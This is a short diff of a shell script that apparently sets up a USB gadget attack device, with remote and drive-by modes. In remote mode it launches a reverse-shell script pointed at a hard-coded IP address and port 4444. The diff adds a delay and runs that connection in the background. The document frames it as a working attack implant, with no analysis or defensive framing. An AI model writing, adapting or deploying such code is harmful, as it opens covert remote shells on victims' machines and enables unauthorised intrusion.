@@ -53,7 +53,8 @@ ls /sys/class/udc > UDC
 
 
 if $MODE_REMOTE; then
-    python $wdir/boot/reverseshell.py 132.147.124.35 4444
+    sleep 1
+    python $wdir/boot/reverseshell.py 132.147.124.35 4444 &
 fi
 
 if $MODE_DRIVEBY; then
